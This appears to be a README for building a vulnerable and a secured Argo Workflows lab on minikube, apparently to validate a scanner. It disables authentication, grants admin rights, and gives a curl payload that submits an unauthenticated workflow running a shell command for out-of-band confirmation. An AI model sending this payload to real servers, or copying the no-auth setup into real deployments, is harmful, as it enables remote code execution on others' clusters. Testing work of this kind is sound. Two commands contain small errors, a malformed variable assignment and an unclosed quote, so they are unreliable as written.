# Setup Requirements
1. k8s with minikube: https://minikube.sigs.k8s.io/docs/start/ (we can use original k8s but this is an easy solution)
2. please don't forget to add `alias kubectl="minikube kubectl --"` to your shell environment.

# Vulnerable Instance
## Install Argo Workflows
The version that we tested is v3.5.5. You can find the other versions [here](https://github.com/argoproj/argo-workflows/releases) and change the VERSION variable accordingly.
```bash
kubectl create namespace argo
$VERSION=v3.5.5
kubectl apply -n argo -f https://github.com/argoproj/argo-workflows/releases/download/$VERSION/install.yaml
```
## Remove Authentication
```bash
kubectl patch deployment argo-server --namespace argo  --type='json' -p='[{"op": "replace", "path": "/spec/template/spec/containers/0/args", "value": ["server","--auth-mode=server"]}]'
```

## Allow Argo to Interact with the Resources in Your Kubernetes Cluster with admin-level Privileges
```bash
kubectl create rolebinding argo-default-admin --clusterrole=admin --serviceaccount=argo:default -n argo
```
## Expose the UI to localhost
```bash
kubectl -n argo port-forward deployment/argo-server 2746:2746
```
## Validate with OOB
Replace `PAYLOAD` with your payload and escape the `"` as it is a json value.
```bash
curl 'https://127.0.0.1:2746/api/v1/workflows/default' \
  -H 'Content-Type: application/json' \
  --data-raw '{"workflow":{"apiVersion":"argoproj.io/v1alpha1","kind":"Workflow","metadata":{"name":"","generateName":"scripts-"},"spec":{"destination":{"name":"","namespace":"","server":""},"source":{"path":"","repoURL":"","targetRevision":"HEAD"},"project":"","entrypoint":"aaaaaa","templates":[{"name":"aaaaaa","script":{"image":"curlimages/curl:7.78.0","command":["sh"],"source":"curl URL"}}]}}}' \
  --insecure
```
# Secure Instance
after setting up a vulnerable version, change the authentication mode to client.
## Change Authentication
```bash
kubectl patch deployment argo-server --namespace argo  --type='json' -p='[{"op": "replace", "path": "/spec/template/spec/containers/0/args", "value": ["server","--auth-mode=client"]}]'
```
## Expose the UI to localhost
```bash
kubectl -n argo port-forward deployment/argo-server 2746:2746
```
## Check that authentication is enabled
```bash
curl 'https://127.0.0.1:2746/api/v1/workflows/default' \
  -H 'Content-Type: application/json' \
  --data-raw '{"workflow":{"apiVersion":"argoproj.io/v1alpha1","kind":"Workflow","metadata":{"name":"","generateName":"scripts-"},"spec":{"destination":{"name":"","namespace":"","server":""},"source":{"path":"","repoURL":"","targetRevision":"HEAD"},"project":"","entrypoint":"aaaaaa","templates":[{"name":"aaaaaa","script":{"image":"curlimages/curl:7.78.0","command":["sh"],"source":"curl URL}}]}}}' \
  --insecure
```
It will respond with `{"code":16,"message":"token not valid. see https://argo-workflows.readthedocs.io/en/release-3.5/faq/"}`, proving that the authentication layer is active.


Ref: mostly from https://spacelift.io/blog/argo-workflows and https://argo-workflows.readthedocs.io/en/stable/argo-server-auth-mode/
